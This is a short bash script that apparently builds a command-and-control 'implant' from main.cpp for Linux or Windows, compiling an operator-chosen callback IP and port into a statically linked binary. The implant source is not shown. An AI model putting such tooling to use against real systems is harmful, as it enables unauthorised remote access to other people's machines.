#!/bin/bash

OS=$1
IP=$2
PORT=$3


if [ -z "$OS" ] || [ -z "$IP" ] || [ -z "$PORT" ]; then
    echo "Usage: $0 <linux/windows> <ip> <port> "
    exit 1
fi

src="main.cpp"

if [ $OS == "linux" ]; then
    linux_out="implant_linux"
    #gcc $src -o $linux_out -lcjson --static -lcrypto -lssl
    g++ $src -o $linux_out -static -lcjson -lssl -lcrypto -ldl -lpthread \
    -DADDR="\"$IP\"" -DPORT=$PORT #-Dfile_path=$ID_PATH
    echo "[+] LINUX IMPLANT DONE\n"
    exit 1
elif [ $OS == "windows" ]; then
    win_out="implant_windows"
    i686-w64-mingw32-g++ -Wall -O2 -ffunction-sections -fdata-sections -fmerge-all-constants \
                        -static-libstdc++ -static-libgcc ./includes/cJSON/cJSON.c \
                        $src -o $win_out -lws2_32 -lsecur32 \
                        -DADDR="\"$IP\"" -DPORT=$PORT 
    echo "[+] WINDOWS IMPLANT DONE\n"
    exit 1
fi